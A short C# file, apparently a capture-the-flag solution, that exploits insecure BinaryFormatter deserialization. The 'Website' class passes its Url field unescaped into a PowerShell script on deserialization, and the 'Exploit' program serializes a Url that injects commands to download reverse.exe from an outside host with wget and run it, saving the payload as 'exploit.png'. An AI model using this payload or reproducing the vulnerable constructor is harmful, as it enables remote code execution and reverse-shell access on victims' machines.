using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Management.Automation;
using Challenge.Models;

namespace Challenge.Models
{
    [Serializable]
    public class Website : ISerializable
    {
        public string Url { get; set; }
        public string Status { get; set; }

        public Website()
        {
            
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.AssemblyName = "Challenge";

            info.AddValue("Url", Url);
        }

        public Website(SerializationInfo info, StreamingContext context)
        {
            Url = info.GetString("Url");
            try
            {
                PowerShell ps = PowerShell.Create();
                ps.AddScript("Invoke-WebRequest -UseBasicParsing -Uri \"" + Url + "\" | Select -exp StatusDescription");
                PSObject result = ps.Invoke()[0];

                Status = result.ToString();
            }
            catch
            {
                Status = "Erro";
            }
        }

    }
}

namespace Exploit
{
    class Program
    {
        static void Main(string[] args)
        {
            Website website = new Website();
            website.Url = "\"; mkdir /teste/ ; wget https://caueo.me/reverse.exe -O /teste/reverse.exe; /teste/reverse.exe; #";
            BinaryFormatter formatter = new BinaryFormatter();

            FileStream fs = new FileStream("exploit.png", FileMode.Create);
            formatter.Serialize(fs, website);
        }
    }
}
